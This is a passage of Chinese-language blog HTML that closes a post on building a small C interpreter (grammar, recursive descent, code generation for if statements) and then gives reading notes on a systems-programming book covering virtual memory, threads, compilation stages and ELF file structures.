&lt;term&gt;</span><br><span class="line"></span><br><span class="line">&lt;term&gt; ::= &lt;term&gt; * &lt;factor&gt;</span><br><span class="line">         | &lt;term&gt; / &lt;factor&gt;</span><br><span class="line">         | &lt;factor&gt;</span><br><span class="line"></span><br><span class="line">&lt;factor&gt; ::= ( &lt;expr&gt; )</span><br><span class="line">           | Num</span><br></pre></td></tr></table></figure><p>用尖括号<code>&lt;&gt;</code>括起来的就是<strong>非终结符</strong>，因为它们可以用<code>::=</code>右边的式子代替。<code>|</code>的意思是<code>或</code>，比如说：expr中那三个式子都可以替换expr。</p><p>没出现在<code>::=</code>左边的就是<strong>终结符</strong>，终结符一般对应词法分析器输出的标记。</p><h2 id="递归下降"><a href="#递归下降" class="headerlink" title="递归下降"></a>递归下降</h2><p>编写语法分析器有两种方法，一种是从起始非终结符开始，不断把非终结符分解，直到匹配输入的终结符；另一种是把终结符不断合并，直到合成非终结符。</p><p>我们用的是第二种，也就是递归下降。</p><p>它的过程是:</p><p><img src="https://i.loli.net/2021/05/13/PmXfl7dcMh3uCjo.png" alt="image-20210513134524566"></p><p>再后面就是将语句等编译成汇编代码了</p><h2 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h2><p>语句：语句就是表达式加上<code>;</code>。</p><p>我们的编译器中识别6种语句：</p><ol><li><code>if (...) &lt;statement&gt; [else &lt;statement&gt;]</code></li><li><code>while (...) &lt;statement&gt;</code></li><li><code>&#123; &lt;statement&gt; &#125;</code></li><li><code>return xxx;</code></li><li><code>&lt;empty statement&gt;</code>;</li><li><code>expression;</code> (expression end with semicolon)</li></ol><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (...) &lt;statement&gt; [<span class="keyword">else</span> &lt;statement&gt;]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (&lt;cond&gt;)                   &lt;cond&gt;</span><br><span class="line">                                JZ a</span><br><span class="line">    &lt;true_statement&gt;   ===&gt;     &lt;true_statement&gt;</span><br><span class="line">  <span class="keyword">else</span>:                         JMP b</span><br><span class="line">a:                           a:</span><br><span class="line">    &lt;false_statement&gt;           &lt;false_statement&gt;</span><br><span class="line">b:                           b:</span><br></pre></td></tr></table></figure><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (token == If) &#123;</span><br><span class="line">    <span class="built_in">match</span>(If);</span><br><span class="line">    <span class="built_in">match</span>(<span class="string">&#x27;(&#x27;</span>);</span><br><span class="line">    <span class="built_in">expression</span>(Assign);  <span class="comment">// parse condition</span></span><br><span class="line">    <span class="built_in">match</span>(<span class="string">&#x27;)&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    *++text = JZ;</span><br><span class="line">    b = ++text;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">statement</span>();         <span class="comment">// parse statement</span></span><br><span class="line">    <span class="keyword">if</span> (token == Else) &#123; <span class="comment">// parse else</span></span><br><span class="line">        <span class="built_in">match</span>(Else);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// emit code for JMP B</span></span><br><span class="line">        *b = (<span class="keyword">int</span>)(text + <span class="number">3</span>);</span><br><span class="line">        *++text = JMP;</span><br><span class="line">        b = ++text;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">statement</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *b = (<span class="keyword">int</span>)(text + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只有if，while，return生成汇编代码。其余不生成。</p><blockquote><p>match函数用于比较token是否正确，如果不正确就会报错退出。</p></blockquote><p>解析表达式主要是实现运算符优先级这里麻烦一些。</p><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>回答一下我开这个坑的疑问：编写编译器(不，这是解释器)的过程大概是怎样的。</p><p>答：</p><ol><li>首先我们要写一个虚拟机，里面划分堆栈段。然后写出基本的寄存器。</li><li>再然后要制作我们自己的指令集。我们可以把代码转换成汇编，然后存放在虚拟机的text段。</li><li>然后就是写词法分析器，它会把源码修改成标记，为了方便语法分析器。</li><li>到了语法分析器，<code>3*4</code>可能就已经被修改成了<code>num1 Mul num2</code>。</li><li>最后需要把这些变成汇编语言就可以了。</li></ol><p>代码就先不写了，因为目前用不到。可能以后深入的话，学点更难的。</p><p>另外我是懒狗，如果想要学好点的话，最好把代码抄一遍()</p>]]></content>
      
      
      <categories>
          
          <category> 2021年5月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[读书笔记] 程序员的自我修养</title>
      <link href="/2021/03/08/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/"/>
      <url>/2021/03/08/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h1><p>这里照例是不知道写些什么的</p><p>不过放个蛮不错的思维导图，看书的时候可以用来辅助，找找自己的遗漏</p><p><a href="https://zhuanlan.zhihu.com/p/111682188">https://zhuanlan.zhihu.com/p/111682188</a></p><p><a href="https://zhuanlan.zhihu.com/p/138345701">https://zhuanlan.zhihu.com/p/138345701</a></p><h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><h2 id="第一章-温故而知新"><a href="#第一章-温故而知新" class="headerlink" title="第一章 温故而知新"></a>第一章 温故而知新</h2><h3 id="A-杂记"><a href="#A-杂记" class="headerlink" title="A.杂记"></a>A.杂记</h3><p>1.早期的计算机结构图：</p><p><img src="https://i.loli.net/2021/03/08/7tJSALsYqEMuivU.png" alt="image-20210308010516828"></p><blockquote><p>这时的计算机CPU频率不高，和内存一样，所以它们可以直接连接在一个总线(Bus)上。其它I/O设备与内存和CPU相比还是差很多，为了协调速度，每个设备会有一个相应的I/O控制器。</p></blockquote><p>这些硬件结构虽然看起来复杂，但实际上还是最初的CPU、内存和I/O设备。</p><p><img src="https://i.loli.net/2021/03/08/uT4v1coxznRtyaw.png" alt="image-20210308011406962"></p><blockquote><p>后来由于CPU核心频率的提升，导致内存跟不上CPU的速度，于是产生了与内存频率一致的系统总线。接着随着图形化操作系统的普及，使得图形芯片需要跟CPU和内存大量交换数据，所以人们设计了一个高速的北桥芯片。<br>又由于北桥运行速度非常高，相对低速的设备如果连接在北桥上，北桥既需处理高速设备，又需处理低速设备，设计就会变得十分复杂，于是人们又设计了专门处理低速设备的南桥芯片，由南桥芯片把低速设备汇总后，连接到北桥上。20世纪90年代的PC机在系统总线上采用的是PCI结构，而在低速设备上用的是ISA总线。</p></blockquote><p>2.计算机体系结构</p><p><img src="https://i.loli.net/2021/03/08/Fv8BciZAUVIkbN9.png" alt="image-20210308012450449"></p><p>这个就是上层用下层提供的接口api，来完成对下层的操作。例如此图的操作系统内核层，对于硬件层来说就是硬件接口的使用者，而硬件是接口的定义者，这种接口被称作硬件规格。</p><p>3.我们想要充分利用CPU，所以编写了一个监控程序，当计算机中某程序不需要使用CPU时，监控程序就把另外等待CPU资源的程序启动，让CPU能充分利用起来。这种被称为<strong>多道程序</strong>，虽然能提高CPU的利用率，但是程序之间不分轻重缓急，例如如果我们点击鼠标，程序等了10分钟才有反应。<br>经过改进，程序运行模式变成了每个程序都运行一小段时间，这对于一些交互式任务尤为重要，例如点击一下鼠标或按一下键盘。这种模式叫做<strong>分时系统</strong>。windows3.1中，程序会判断是否有其他程序正在等待CPU，如果有，则可能暂停当前的程序，把CPU让出来给其他的程序。但是如果运行一个很耗时的程序时，操作系统没办法，其他程序只能等待。<br>大多数的现代操作系统用的是<strong>多任务系统</strong>，所有的应用程序以<strong>进程</strong>的方式运行在比操作系统权限更低的级别，每个进程都有自己独立的地址空间，相互隔离。CPU由操作系统统一分配，根据优先级的高低都有机会得到CPU。当运行时间超出了一定的时间，操作系统会暂停进程，把CPU资源分配给别的进程，这种CPU的分配方式就是所谓的<strong>抢占式</strong>，操作系统可以强制剥夺CPU资源并且分配给它认为目前最需要的进程。</p><p>4.操作系统出现后，硬件逐渐被抽象成了一系列概念。程序员可以从硬件细节中解放出来，更多关注应用程序本身的开发，繁琐的硬件细节交给了操作系统中的<strong>硬件驱动程序</strong>来完成。这些驱动通常由硬件厂商完成，操作系统为硬件生产厂商提供了接口和框架。</p><h3 id="B-虚拟内存"><a href="#B-虚拟内存" class="headerlink" title="B.虚拟内存"></a>B.虚拟内存</h3><p>早期的计算机中，程序是直接运行在物理内存上的。这样会出现几个问题：</p><ul><li><strong>地址空间不隔离</strong> 恶意的程序可以很容易改写其他程序的内存数据，一个任务崩溃，可能会影响到其他任务；</li><li><strong>内存使用效率低</strong> 因为程序需要的空间是连续的，如果程序A正在运行，我们运行程序B时内存不够，需要把程序A换到磁盘，再读取B到内存开始运行。</li><li><strong>程序运行的地址不确定</strong> 因为程序在编写时，它访问数据和指令跳转时的目标地址都是固定的。</li></ul><p>虚拟地址空间是指虚拟的，人们想象出来的地址空间，其实它并不存在。每个进程都有自己独立的虚拟空间，而且每个进程只能访问自己的地址空间，这样有效地做到了进程的隔离。</p><p><strong>分段</strong>：</p><p>分段的基本思路是虚拟出一块地址空间，然后我们把物理地址映射到这段虚拟地址空间中，这个映射由软件来设置，比如操作系统来设置这个映射函数，实际的地址转换则由硬件完成。<br>分段这种方法解决了隔离的问题，如果程序访问虚拟空间的地址超过了范围，硬件就会判断这是一个非法请求，拒绝请求并报告给操作系统或者监控程序，由它处理。<br>同时也解决了地址不确定的问题，因为程序只需要按照虚拟地址空间来进行编写程序即可。<br>但是这种方法还是没解决第二个问题。但实际上，程序在运行时，在某个时间段，只是频繁的用到了一小部分数据。所以人们想到了进行内存分割提高内存使用率，这种方法就是分页。</p><p><strong>分页</strong>：</p><p>分页的基本方法就是把地址空间人为的分成固定大小的页，每一页的大小由硬件决定，或硬件支持多种大小页，由操作系统选择决定页的大小。几乎所有32位PC上的操作系统都用4KB大小的页。物理空间也是同样的分法。</p><p>举个栗子：<br>我们把进程的虚拟地址空间按页分割，把常用的数据和代码页装载到内存中，把不常用的代码和数据保存在磁盘上，用到的时候把它从磁盘中取出来即可。<br>以下图为例，我们假设有两个进程Process1和Process2，它们进程中的部分虚拟页面被映射到了物理页面，比如VP0、VP1和VP7映射到PP0、PP2和PP3；而VP2和VP3位于磁盘的DP0和DP1中；另外VP4、VP5、VP6可能尚未使用或访问，暂时处于未使用的状态。在这里，我们把虚拟空间的页就叫**虚拟页(VP，Virtual Page)<strong>，把物理内存中的页叫做</strong>物理页(PP，Physical Page)<strong>，把磁盘中的页叫做</strong>磁盘页(DP，Disk Page)**。虚拟空间的有些页被映射到了同一个物理页，这样就可以实现内存共享。</p><p>图中Process1的VP2和VP3不在内存中，当进程需要使用这两个页时，硬件会捕获这个消息，这就是所谓的**页错误(Page Fault)**，然后操作系统接管进程，把VP2和VP3从磁盘中读出来装入内存。</p><p><img src="https://i.loli.net/2021/03/11/EA5x1szNlBHK62t.png" alt="image-20210311235942347"></p><p>每个页可以设置权限属性，只有操作系统有权限修改这些属性，这可以做到保护自己和进程。</p><p>几乎所有的硬件都采用MMU(Memory Management Unit)来进行页映射。<br>CPU发出虚拟地址，在CPU转换后(MMU一般集成在CPU内部)变成物理地址。</p><p><img src="https://i.loli.net/2021/03/12/EjHQOw6okbqN8SX.png" alt="image-20210312002436967"></p><h3 id="C-线程"><a href="#C-线程" class="headerlink" title="C.线程"></a>C.线程</h3><p><strong>线程(Thread)<strong>，有时被称为</strong>轻量级进程</strong>，是程序执行流的最小单元。<br>一个标准的线程由线程ID、当前指令指针(PC)、寄存器集合和堆栈组成。<br>通常意义上，一个进程由一个到多个线程组成，各个线程之间共享程序的内存空间和一些进程级的资源(比如打开文件和信号)。</p><p>大多数软件应用中，线程的数量都不止一个，多个线程可以互不干扰地并发执行，使用多线程的优势如下：</p><ul><li>某个操作可能会陷入长时间等待，等待的线程会无法继续执行，多线程可以利用等待时间。</li><li>某个操作会消耗大量时间，如果只有一个线程，程序和用户之间的交互会中断，多线程可以让一个线程负责交互，另一个线程负责计算。</li><li>程序逻辑本身要求并发操作</li><li>多CPU或多核计算机，本身具有执行多个线程的能力，单线程无法全面发挥计算机的计算能力。</li><li>多线程在数据共享方面效率会更高。</li></ul><p>线程的访问非常自由，它可以访问进程内存里的所有数据，甚至包括其他线程的堆栈。在实际运用中线程也有自己的私有存储空间，包括以下几方面</p><ul><li>栈(尽管也可以被其他线程访问，但一般情况下认为是私有数据)</li><li>线程局部存储(Thread Local Storage，TLS)。操作系统为线程提供的很有限的私有空间。</li><li>寄存器(包括PC寄存器)，寄存器是执行流的基本数据，因此为线程私有</li></ul><p><img src="https://i.loli.net/2021/03/12/g7OKMvA8Ibc2Jz9.png" alt="image-20210312005414382"></p><p>线程是并发执行的，在单处理器时用多线程，并发是一种模拟出来的状态，操作系统会让多线程程序轮流执行一小段时间，这样每个线程就看起来同时在执行。这样一个不断在处理器上切换不同线程的行为称之为**线程调度(Thread Schedule)**。</p><p>在优先级调度的环境下，线程的优先级改变一般有三种方式:</p><ul><li>用户指定优先级</li><li>根据进入等待状态的频繁程度提升或降低优先级(频繁需要等待的线程优先级更容易提升，因为只需要占用很少时间)</li><li>长时间得不到执行而被提升优先级</li></ul><p>Linux把线程和进程都称为任务，每一个任务概念上都类似于一个单线程的进程，具有内存空间、执行实体、文件资源等。不过Linux下不同的任务之间可以选择共享内存空间，因此在实际意义上，共享了同一个内存空间的多个任务构成了一个进程，这些任务也就成了这个进程里的线程。</p><p><strong>同步与锁</strong></p><p>为了避免多个线程同时读写同一个数据，我们需要使用<strong>同步</strong>，指在一个线程访问数据未结束时，其他线程不得对同一个数据进行访问。<br>同步最常见的方法是使用<strong>锁(Lock)<strong>。这是一种非强制机制，每一个线程在访问数据或资源之前首先获取锁，并在访问结束之后释放锁。在锁已经被占用的时候，线程会等待到锁重新可用。</strong>二元信号量</strong>就是最简单的一种锁，它只有占用与非占用两种状态。</p><p>对于允许多个线程并发访问的资源，<strong>多元信号量</strong>是一个很好的选择。一个初始值为N的信号量允许N个线程并发访问，当一个线程访问资源获取信号量时，信号量的值就会减一。当访问完资源后，线程释放信号量，信号量的值就会加一。如果信号量的值小于0，则进入等待状态。</p><p>**互斥量(Mutex)**和二元信号量很相似，不过信号量的一个任务申请成功后，可以由另一个任务释放。互斥量则必须由同一个任务释放。</p><p>**临界区(Critical Section)**是比互斥量更严格的同步手段，临界区和互斥量的区别在于，在一个进程获取临界区后，其他进程无法获取该锁。</p><p>**读写锁(Read-Write Lock)**：</p><p><img src="https://i.loli.net/2021/03/13/oKvCbzlBmPpMefx.png" alt="image-20210313011915853"></p><p><strong>条件变量</strong>可以被多个线程等待，线程也可以唤醒条件变量。也就是说，使用条件变量可以让线程一起等待某个事件的发生，当事件发生时，所有的线程一起恢复执行。</p><p>CPU有可能因为过度优化(例如CPU的换序执行)导致代码出问题。为了保证线程安全，阻止CPU换序是必须的。通常方法是调用CPU提供的指令barrier拦住该指令之前的指令交换到barrier的后面去。</p><p><strong>线程的并发执行是由多处理器或操作系统调度来实现的。</strong>但是用户使用的并不是内核线程，而是用户态的用户线程。用户态线程并不一定在操作系统内核里对应同等数量的内核线程，例如某些轻量级的线程库，对用户来说有三个线程在同时执行，对内核来说只有一个。</p><p>用户态多线程库的实现方法：</p><p>1.一对一模型，一个用户态的线程对应一个内核的线程</p><p><img src="https://i.loli.net/2021/03/13/DsJ2QAogqBbCkmI.png" alt="image-20210313014551589"></p><blockquote><p>这样用户线程就具有了和内核线程一致的优点，实现了真正的并发。但这也同时限制了线程数量，以及操作系统内核线程调度时，切换开销大导致的执行效率下降。</p></blockquote><p>2.多对一模型，多个用户态映射到一个内核线程</p><p><img src="https://i.loli.net/2021/03/13/LCSrpuFchJ2dMnR.png" alt="image-20210313014855513"></p><blockquote><p>多对一相比一对一，在线程的切换上要快速许多以及几乎无限制的线程数量。但是如果一个用户线程阻塞，那么所有的线程都无法执行。</p></blockquote><p>3.多对多模型，多个用户态映射到多个内核线程</p><p><img src="https://i.loli.net/2021/03/13/6193TYMizOWRyEI.png" alt="image-20210313015147020"></p><blockquote><p>一个用户线程阻塞不会让所有用户线程阻塞，同时对线程数量没有限制，性能也能得到一定提升，不过不如一对一模型高。</p></blockquote><h1 id="0x02-静态链接"><a href="#0x02-静态链接" class="headerlink" title="0x02 静态链接"></a>0x02 静态链接</h1><h2 id="第二章-编译和链接"><a href="#第二章-编译和链接" class="headerlink" title="第二章 编译和链接"></a>第二章 编译和链接</h2><p>当我们使用gcc编译程序时，编译器进行了如下步骤</p><ol><li><code>预编译</code>主要处理那些源代码中以”#”开始的预编译指令。</li></ol><ul><li>将所有的#define删除，展开宏定义</li><li>处理条件预编译指令</li><li>处理#include，将被包含的文件插入到该预编译指令的位置。</li><li>删除注释</li><li>添加行号和文件名标识，以便于编译时编译器产生调试用的行号信息及用于编译时产生编译错误或警告时能够显示行号。</li><li>保留所有#pragma编译器指令，因为编译器要使用它们。</li></ul><ol start="2"><li><p><code>编译</code>就是将预处理完的文件进行了一系列的语法分析，优化后生产一个汇编代码文件</p></li><li><p><code>汇编</code>是将汇编代码转换成机器指令</p></li><li><p><code>链接</code>把库文件进行了链接</p></li></ol><p>编译过程一般可以分为6步：扫描、语法分析、语义分析、源代码优化、代码生成和目标代码优化。</p><p><img src="https://i.loli.net/2021/03/16/FPaMpcQ5DUrGJTq.png" alt="image-20210316183219598"></p><p><strong>词法分析(扫描)</strong></p><p>扫描器的任务是简单进行词法分析，把源代码的字符序列分割成一系列记号。记号一般分为几类：关键字、 标识符、字面量(包括数字和字符串等)和特殊符号(如加、等号)。</p><p><strong>语法分析</strong></p><p>语法分析器对扫描器产生的记号进行语法分析，从而产生语法树(以表达式为节点的树)。如果出现了表达式不合法，编译器就会报告语法分析阶段的错误。</p><p><strong>语义分析</strong></p><p>编译器能分析的语义是静态语义(指在编译期可以确定的语义，与之对应的动态语义就是只有在运行期才能确定的语义)。</p><p>例如将一个浮点型的表达式转换成整型，语义分析过程中会完成这个步骤。但是将浮点型赋值给指针时，语义分析程序会发现类型不匹配，编译器将会报错。</p><p>经过语义分析后，整个语法树的表达式都被标识了类型(整形，浮点型等等)，如果有些类型需要做隐式转换，语义分析程序会在语法树上插入相应的转换节点。</p><p>另外像2+6这种表达式是可以被直接优化成8的，因为它的值在编译器就可以被确定。</p><p><strong>中间语言生成</strong></p><p>源代码优化器将整个语法树转换成中间代码，它是语法树的顺序表示，且非常接近目标代码。中间代码有很多类型，在不同编译器中有不同的形状。</p><p>中间代码使编译器可以被分为前端和后端，编译器前端负责产生机器无关的中间代码，编译器后端将中间代码转换成目标机器代码。<br>这样的好处是，对于一些可以跨平台的编译器而言，它们可以针对不同的平台使用同一个前端和针对不同机器平台的多个后端。</p><p><strong>目标代码生成与优化</strong></p><p>编译器后端主要包括代码生成器和目标代码优化器。代码生成器把中间代码转换成目标机器代码。代码优化器对目标代码进行优化，比如选择合适的寻址方式，使用位移来代替乘法运算等等。</p><p><strong>链接</strong></p><p>当以上所有操作做完以后，我们会发现某些函数的地址没有确定(在编译时如果有不知道的函数地址，编译器会将地址搁置，等待链接进行修正)。如果这些函数跟源代码在用一个编译单元里，那么编译器可以分配空间确定地址，但是如果定义在其他程序模块里，我们就需要链接器将目标文件链接成可执行文件。</p><p>最基本的静态链接就是将目标文件和库链接成可执行文件。</p><p>当有不确定的函数出现时，程序会将地址置为0，链接后将修正地址，这个修正的过程被称为<strong>重定位</strong>。</p><h2 id="第三章-目标文件里面有什么"><a href="#第三章-目标文件里面有什么" class="headerlink" title="第三章 目标文件里面有什么"></a>第三章 目标文件里面有什么</h2><p>1.现在PC平台流行的可执行文件格式主要是Windows下的PE和Linux下的ELF。它们都是COFF格式的变种。</p><p>2.目标文件(重定向文件)就是源代码编译后未进行链接的中间文件(Windows下的.obj和Linux下的.o)。它跟可执行文件的格式几乎是一样的。我们可以广义地将目标文件和可执行文件看成一种类型的文件。</p><p>3.动态链接库(Windows的.dll和Linux的.so)和静态链接库(Windows的.lib和Linux的.a)文件也按照同一种格式存储。</p><p>4.静态链接库是把很多目标文件捆绑成一个文件，再加上一些索引。可以把它理解为一个包含很多目标文件的文件包。</p><p>5.可执行文件，Windows的demo.exe和Linux的demo。</p><h3 id="A-段"><a href="#A-段" class="headerlink" title="A.段"></a>A.段</h3><p>1.程序源代码编译后的机器指令经常放在代码段(code section)里，代码段常见的名字有”.code”或”.text”；全局变量和局部静态变量数据经常被放在数据段(data section)，数据段常见的名字是”.data”。</p><p>2.未初始化的全局变量和局部静态变量存放在”.bss”段里。未初始化的全局变量和局部静态变量的默认值都为0，本身可以放到data段，但是因为这种值无意义。bss段只是为未初始化的全局变量和局部静态变量预留位置，它没有内容，所以在文件中不占空间，执行时生成虚拟地址空间。</p><blockquote><p>总体来说，程序源代码被编译后主要分成两种段：程序指令和程序数据。代码段属于程序指令，而数据段和.bss段属于程序数据。</p></blockquote><p>3.指令、数据分段的好处：</p><p>a.数据可读写，指令只读，所以分段可以防止指令被有意或无意的改写。</p><p>b.现代CPU的缓存一般设计为数据缓存和指令缓存分离，所以程序的指令和数据分开存放对CPU的缓存命中率提高有好处。</p><p>c.共享指令：当系统中运行着多个该程序的副本时，它们的指令部分都是一样的，所以内存只需要保存一份指令部分即可。当然每个副本进程的数据区域是不一样的，是进程私有的。</p><p><code>ELF常见段</code></p><p><img src="https://i.loli.net/2021/04/10/RQUr1ficVbCZ5ua.png" alt="image-20210410214059957"></p><h3 id="B-ELF文件结构"><a href="#B-ELF文件结构" class="headerlink" title="B.ELF文件结构"></a>B.ELF文件结构</h3><p><img src="https://i.loli.net/2021/04/10/EwgUFT9jtqDp54v.png" alt="image-20210410215140178"></p><ul><li><p>ELF Header描述整个文件的基本属性，Section Header Table描述了ELF文件包含的所有段的信息。</p></li><li><p>我们可以用<code>readelf</code>命令查看ELF文件</p></li><li><p>elf文件头结构及相关常数被定义在<code>/usr/include/elf.h</code>里，有32位和64位两个版本</p></li></ul><p>elf的自定义宽度:</p><p><img src="https://i.loli.net/2021/04/10/Ra3QuFWVCqNHGef.png" alt="image-20210410221150057"></p><p>32位的ELF Header的定义如下:</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> e_ident[<span class="number">16</span>];</span><br><span class="line">    Elf32_Half e_type;<span class="comment">//ELF文件类型</span></span><br><span class="line">    Elf32_Half e_machine;<span class="comment">//CPU属性</span></span><br><span class="line">Elf32_Word e_version;<span class="comment">//ELF版本，一般为常数1</span></span><br><span class="line">Elf32_Addr e_entry;<span class="comment">//入口地址，规定ELF程序的入口虚拟地址，操作系统从这个地址开始执行指令。可重定位文件一般没有入口地址，值为0</span></span><br><span class="line">Elf32_Off e_phoff;</span><br><span class="line">Elf32_Off e_shoff;<span class="comment">//节表在文件中的偏移</span></span><br><span class="line">Elf32_Word e_flags;<span class="comment">//ELF标志位</span></span><br><span class="line">Elf32_Half e_ehsize;<span class="comment">//ELF文件头的大小</span></span><br><span class="line">Elf32_Half e_phentsize;</span><br><span class="line">Elf32_Half e_phnum;</span><br><span class="line">Elf32_Half e_shentsize;<span class="comment">//节表描述符大小</span></span><br><span class="line">Elf32_Half e_shnum;<span class="comment">//节表数量</span></span><br><span class="line">Elf32_Half e_shstrndx;<span class="comment">//字符串表所在的段，在节表中的下标</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">e_ident&#123;</span><br><span class="line">    Magic: <span class="number">7f</span> <span class="number">45</span> <span class="number">4</span>c <span class="number">46</span></span><br><span class="line">    Class: 标识ELF文件类型，<span class="number">0x01</span>是<span class="number">32</span>位，<span class="number">0x02</span>是<span class="number">64</span>位</span><br><span class="line">    Data: 规定大端序还是小端序</span><br><span class="line">    Version: 规定ELF版本号，一般是<span class="number">1</span></span><br><span class="line">    OS/ABI: 没有意义一般为<span class="number">0</span></span><br><span class="line">    ABI Version: 没有意义一般为<span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>Magic</code>前4个字节是所有ELF文件都必须相同的标识码</p></blockquote><p><code>e_type</code>:</p><p><img src="https://i.loli.net/2021/04/10/OeoYIDiPb7QjcXM.png" alt="image-20210410232756674"></p><p><code>e_machine</code>:</p><p><img src="https://i.loli.net/2021/04/10/RoJ39dX6CAi8MqL.png" alt="image-20210410232908693"></p><p>&lt;————————————分割线————————————&gt;</p><p>Section Header Table就是描述节的基本属性的结构。</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word sh_name;<span class="comment">//段名</span></span><br><span class="line">    Elf32_Word sh_type;<span class="comment">//段的类型</span></span><br><span class="line">    Elf32_Word sh_flags;<span class="comment">//段的标志位</span></span><br><span class="line">    Elf32_Addr sh_addr;<span class="comment">//段的虚拟地址</span></span><br><span class="line">    Elf32_Off sh_offset;<span class="comment">//段的文件偏移</span></span><br><span class="line">    Elf32_Word sh_size;<span class="comment">//段的长度</span></span><br><span class="line">    Elf32_Word sh_link;<span class="comment">//段链接信息</span></span><br><span class="line">    Elf32_Word sh_info;<span class="comment">//段链接信息</span></span><br><span class="line">    Elf32_Word sh_addralign;<span class="comment">//段地址对齐</span></span><br><span class="line">    Elf32_Word sh_entsize;<span class="comment">//项的长度</span></span><br><span class="line">&#125;Elf32_Shdr;</span><br></pre></td></tr></table></figure><p>段的类型(<code>sh_type</code>)</p><p><img src="https://i.loli.net/2021/04/11/y1Sl8J2XOjUfKVC.png" alt="image-20210411000535505"></p><p><img src="https://i.loli.net/2021/04/11/sELGUIJ8XVjuYfN.png" alt="image-20210411000541281"></p><p>段的标志位(<code>sh_flags</code>)</p><p><img src="https://i.loli.net/2021/04/11/PrTfJvd28xKp9WA.png" alt="image-20210411000612666"></p><p>系统保留段</p><p><img src="https://i.loli.net/2021/04/11/KgHyCYBbEnV4iuR.png" alt="image-20210411000721838"></p><p><img src="https://i.loli.net/2021/04/11/B7eAaIJjpgC9Oil.png" alt="image-20210411000728065"></p><p>段的链接信息(<code>sh_link</code>、<code>sh_info</code>)</p><p><img src="https://i.loli.net/2021/04/11/2QEWdskv8ANxpne.png" alt="image-20210411000848895"></p><p>&lt;————————————分割线————————————&gt;</p><p>ELF文件把字符串集中存放在一个表中，然后使用字符串在表中的偏移引用字符串。常见段名为<code>.strtab</code>或<code>.shstrtab</code>，分别为字符串表和段表字符串表，一个用来保存普通字符串，一个用来保存段表中用到的字符串，最常见的如段名。</p><h3 id="C-链接的接口-符号"><a href="#C-链接的接口-符号" class="headerlink" title="C.链接的接口-符号"></a>C.链接的接口-符号</h3><p>每个函数或变量都有自己独特的名字，这样能避免链接过程中不同变量和函数之间的混淆。我们将函数和变量统称为符号，函数名或变量名就是符号名。</p><p>每个目标文件有一个符号表，里面记录了目标文件中用到的符号。每个函数和变量的符号值都是它们的地址。</p><p>还有几个其它的符号:</p><ul><li>全局符号，可以被其他目标文件引用</li><li>在本目标文件引用的全局符号，被称为外部符号</li><li>段名，由编译器产生，值是该段的起始地址</li><li>局部符号，对编译过程没有作用，编译器往往忽略。</li><li>行号信息，目标文件指令和源代码中代码行的对应关系</li></ul><p>我们值得关注的是全局符号，其它对链接是无关紧要的，因为它们对其他目标文件来说是不可见的。</p><p>&lt;————————————分割线————————————&gt;</p><p>符号表结构</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 